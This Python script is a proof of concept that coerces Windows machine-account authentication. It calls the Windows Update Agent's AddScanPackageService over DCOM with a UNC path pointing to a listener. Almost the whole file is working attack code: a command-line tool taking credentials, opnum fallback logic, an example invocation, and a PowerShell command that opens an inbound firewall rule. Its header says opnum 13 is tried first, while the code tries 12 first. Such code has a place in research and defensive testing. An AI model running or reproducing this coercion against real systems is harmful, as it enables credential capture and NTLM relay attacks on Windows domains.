#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Proof of concept for coercing authentication with
# MS-UAMG::IUpdateServiceManager2::AddScanPackageService() (opnum 13).
#
# AddScanPackageService registers a "scan package" update service from a cabinet
# file. The Windows Update Agent opens scanFileLocation **synchronously** to read
# the scan package, so a UNC path there makes the WUA COM server (running as the
# machine account) authenticate outbound to the listener. (The sibling
# AddService2 only *stores* authorizationCabPath and does not read it
# synchronously on current Windows, so it does not coerce -- AddScanPackageService
# is the working vector.)
#
# DCOM chain:
#   CoCreateInstanceEx(CLSID_UpdateServiceManager, IID_IUpdateServiceManager2)
#   QueryInterface IUpdateServiceManager2
#   AddScanPackageService(serviceName, scanFileLocation="\\<listener>\share\scan.cab", flags=0)
#
# Opnum note: [MS-UAMG] numbers AddScanPackageService as opnum 13. On Windows
# Server 2025 (build 26100) the on-wire vtable is shifted by -1 (this build's
# IUpdateServiceManager2 has one fewer method than the published interface), so the
# method is reached at opnum 12. This PoC tries 13 first and falls back to 12.
#
# PREREQUISITES on the target:
#   1. Local administrator (WUA DCOM launch/access).
#   2. The Windows Update Agent COM object is activated **out-of-process in
#      dllhost.exe (COM Surrogate)** on a *dynamic* RPC port, and there is NO
#      predefined Windows firewall group for it. Remote calls therefore require an
#      explicit, non-default inbound firewall rule, e.g. program-scoped to the
#      surrogate:
#        New-NetFirewallRule -DisplayName "COM Surrogate RPC" -Direction Inbound `
#          -Action Allow -Protocol TCP -Program "%SystemRoot%\System32\dllhost.exe"
#      (or open the RPC dynamic range 49152-65535). Not present by default.
#
#   ./coerce_poc.py -d LAB.local -u user -p 'Password123!' 192.168.2.51 192.168.2.1
#     (positional order: <listener> <target>)
import argparse

from impacket.dcerpc.v5.dcomrt import DCOMConnection, DCOMCALL, DCOMANSWER, PMInterfacePointer
from impacket.dcerpc.v5.dtypes import LONG, ULONG
from impacket.dcerpc.v5.dcom.oaut import BSTR
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket import hresult_errors
from impacket.uuid import string_to_bin, uuidtup_to_bin

CLSID_UpdateServiceManager = string_to_bin('F8D253D9-89A4-4DAA-87B6-1168369F0B21')
IID_IUpdateServiceManager2 = uuidtup_to_bin(('0BB8531D-7E8D-424F-986C-A0B8F60A3E7B', '0.0'))


class DCERPCSessionError(DCERPCException):
    def __str__(self):
        c = self.error_code or 0
        if c in hresult_errors.ERROR_MESSAGES:
            return 'AddScanPackageService HRESULT: 0x%08x - %s' % (c, hresult_errors.ERROR_MESSAGES[c][0])
        return 'AddScanPackageService HRESULT: 0x%08x' % c


# IUpdateServiceManager::AddScanPackageService
#   HRESULT AddScanPackageService([in] BSTR serviceName, [in] BSTR scanFileLocation,
#                                 [in] LONG flags, [out, retval] IUpdateService** ppService)
class AddScanPackageService(DCOMCALL):
    opnum = 13
    structure = (('serviceName', BSTR), ('scanFileLocation', BSTR), ('flags', LONG))


class AddScanPackageServiceResponse(DCOMANSWER):
    structure = (('ppService', PMInterfacePointer), ('ErrorCode', ULONG))


def _bstr(s):
    b = BSTR()
    b['Data']['asData'] = s
    return b


def main():
    ap = argparse.ArgumentParser(add_help=True, description='MS-UAMG AddScanPackageService coercion PoC.')
    ap.add_argument('-d', '--domain', default='')
    ap.add_argument('-u', '--username', required=True)
    ap.add_argument('-p', '--password', default='')
    ap.add_argument('--share', default='share')
    ap.add_argument('listener')
    ap.add_argument('target')
    a = ap.parse_args()

    unc = '\\\\%s\\%s\\scan.cab' % (a.listener, a.share)
    print('[>] Activating CLSID_UpdateServiceManager, IID_IUpdateServiceManager2 ...')
    dcom = DCOMConnection(a.target, a.username, a.password, a.domain, oxidResolver=True)
    try:
        iM = dcom.CoCreateInstanceEx(CLSID_UpdateServiceManager, IID_IUpdateServiceManager2)
        iM = iM.RemQueryInterface(1, (IID_IUpdateServiceManager2,))
        print('[+] AddScanPackageService(scanFileLocation=%s) ...' % unc)
        # Server 2025 on-wire opnum is 12; [MS-UAMG] documents 13. Try both.
        for opnum in (12, 13):
            req = AddScanPackageService()
            req.opnum = opnum
            req['serviceName'] = _bstr('scan')
            req['scanFileLocation'] = _bstr(unc)
            req['flags'] = 0
            try:
                iM.request(req, IID_IUpdateServiceManager2, iM.get_iPid())
                print('[+] opnum %d returned S_OK -- check your listener' % opnum)
                return
            except Exception as e:
                es = str(e)
                # RPC-level faults mean 'wrong opnum for this build' -> try the other one.
                if '6d1' in es or '6f7' in es or 'bad_stub' in es:
                    print('[i] opnum %d not this build (%s), trying next ...' % (opnum, es[:30]))
                    continue
                # A real HRESULT response means the method executed (coercion fired).
                print('[+] opnum %d executed: %s -- check your listener' % (opnum, es[:80]))
                return
    finally:
        dcom.disconnect()


if __name__ == '__main__':
    main()
